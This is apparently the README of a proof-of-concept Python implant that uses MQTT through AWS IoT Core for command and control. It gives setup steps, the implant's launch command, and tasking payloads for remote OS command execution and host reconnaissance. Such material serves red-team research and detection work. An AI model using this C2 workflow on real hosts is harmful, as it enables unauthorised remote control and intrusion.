# Sukoshi | 少し

## Overview
Sukoshi is a proof-of-concept Python implant that leverages the [MQTT protocol](https://mqtt.org/) for C2 and uses AWS [IoT Core](https://aws.amazon.com/iot-core/) as infrastructure. It is intended to demonstrate the use of MQTT for C2 and the way in which AWS IoT Core can be integrated with an implant.

***Note: This project was not built to be used in a production setting. It is designed as a proof-of-concept and it intentionally omits many features that would be expected in a modern C2 project.***

## Features
* Automated setup and deployment of an implant using MQTT for C2. Can be used to easily test and analyze an implant leveraging this protocol.
* Connects AWS IoT Core to an implant. Can be further expanded to integrate AWS services such as [IoT Analytics](https://aws.amazon.com/iot-analytics/) for logging/data analysis/visualization and [IoT Events](https://aws.amazon.com/iot-events/) for automated configuration/response to anomalous events.

## Setup

### Python Requirements
The AWS IoT Python libraries are needed by the implant. Please execute the following to install the dependencies:
1. On the command line, navigate to the root of the Sukoshi project
2. Execute the following to install the dependencies:
```
pip install -r requirements.txt
```

### Terraform
This project includes Terraform files to automate deployment of the AWS IoT Core infrastructure that is needed by the implant.

The following resources will be created in the target AWS account:
* AWS IoT Certificate
* AWS IoT Policy
* AWS IoT Thing

The certificates needed to connect the implant with AWS infrastructure will be created in the `/terraform/certs` folder.

The process for setting this up is as follows:
1. Ensure you have Terraform setup and installed (https://learn.hashicorp.com/tutorials/terraform/install-cli)
2. Ensure you have AWS user credentials with the proper IAM permissions configured on the CLI (https://docs.aws.amazon.com/cli/latest/userguide/getting-started-quickstart.html). For testing purposes, you can attach the managed policy "AWSIoTConfigAccess" to the user.
3. From the command line, navigate to the `/terraform` folder
4. Execute the following commands to setup the required infrastructure using Terraform: 
```
terraform init
terraform plan
terraform apply
```
5. Take note of the `implant_command_line` output from Terraform, it will be used to start the implant
7. Execute the following command to destroy the infrastructure when finished testing:
```
terraform destroy
```

## Usage
The implant has been configured with very basic functionality to demonstrate the usage of MQTT for C2 and integration with AWS IoT Core. For simplicity, interaction with the implant by an operator is primarily done through the [MQTT test client](https://docs.aws.amazon.com/iot/latest/developerguide/view-mqtt-messages.html) in the AWS IoT Core console page.

The following is an example of the end-to-end flow for the implant C2:
1. Navigate to the AWS IoT Core console page
2. Under the "Test" dropdown in the sidebar, click "MQTT test client"
3. On the "Subscribe to a topic" tab in the "Topic filter" field, enter `c2/results` as a topic and click "Subscribe". Note that `c2/results` appears under the "Subscriptions" window.
4. Repeat the above step for the `c2/tasking` and `c2/heartbeat` topics. For convenience, you may choose to favorite each of these subscribed topics by clicking the heart icon.
5. Start the implant by executing the command line obtained from the Terraform output (`implant_command_line`), a sample can be seen below:
```
python implant.py --endpoint example-ats.iot.us-east-1.amazonaws.com --cert terraform/certs/sukoshi_implant.cert.pem --key terraform/certs/sukoshi_implant.private.key --client-id sukoshi_client_id --port 443
```
6. Observe that output begins to appear in the `c2/heartbeat` channel
7. Click on the "Publish to a topic" tab and enter `c2/tasking` in the "Topic name" field
8. In the "Message payload" field, enter the following:
```
{
  "task": "ping",
  "arguments": ""
}
```
9. Click the "Publish" button and observe that the task is published to the `c2/tasking` topic in "Subscriptions"
10. Observe the implant receiving the task, performing the work and publishing results
```
Publishing message to topic 'c2/heartbeat': {"contents": "heartbeat", "success": "true"}
Received message from topic 'c2/tasking': b'{\n  "task": "ping",\n  "arguments": ""\n}'
Publishing message to topic 'c2/heartbeat': {"contents": "heartbeat", "success": "true"}
Publishing message to topic 'c2/results': {"contents": "pong", "success": "true"}
```
11. Observe the results appear in the `c2/results` topic:
```
{
  "contents": "pong",
  "success": "true"
}
```
12. To view other sample tasking payloads, see the [Supported Tasks](#supported-tasks) section.

## Screenshots

### Accessing the MQTT test client to send tasks/view results
![screen_1](https://i.imgur.com/pqLg2pk.png)

### Subscribing to topics
![screen_2](https://i.imgur.com/WyilvlF.png)

### Publishing tasks and viewing results
![screen_3](https://i.imgur.com/zXFrBvv.png)

## Supported Tasks
The following are sample payloads for supported tasks you can paste into the "Message payload" field within the AWS "MQTT test client" page.

### Command Execution
Execute an OS command and retrieve the results. In this case, the `whoami` command is provided.
```
{
  "task": "exec",
  "arguments": "whoami"
}
```

### Host Reconaissance
Gather basic details about the host where the implant is running, including host name and OS info.
```
{
  "task": "host-recon",
  "arguments": ""
}
```

### Ping
Send a ping and get back a pong. Simple task used to validate end-to-end C2.
```
{
  "task": "ping",
  "arguments": ""
}
```

### Configure Dwell Time
Set the time the implant should wait before executing tasks and returning results. Time is in seconds.
```
{
  "task": "set-dwell-time",
  "arguments": "10"
}
```

### Exit
Ask the implant to end the beaconing loop and disconnect from the endpoint.
```
{
  "task": "exit",
  "arguments": ""
}
```

## Credits
* Daniel Abeles ([@Daniel_Abeles](https://twitter.com/daniel_abeles)) and Moshe Zioni for their work while at Akamai Threat Research. Their MQTT-PWN project served as an excellent reference during development: 
    * https://github.com/akamai-threat-research/mqtt-pwn
    * https://mqtt-pwn.readthedocs.io/en/latest/plugins/c2.html
* Soracom Labs, for the Terraform AWS IoT setup files: https://github.com/soracom-labs/soracom-beam-to-aws-iot-terraform
* AWS for their IoT Device SDK sample code: https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/pubsub.py
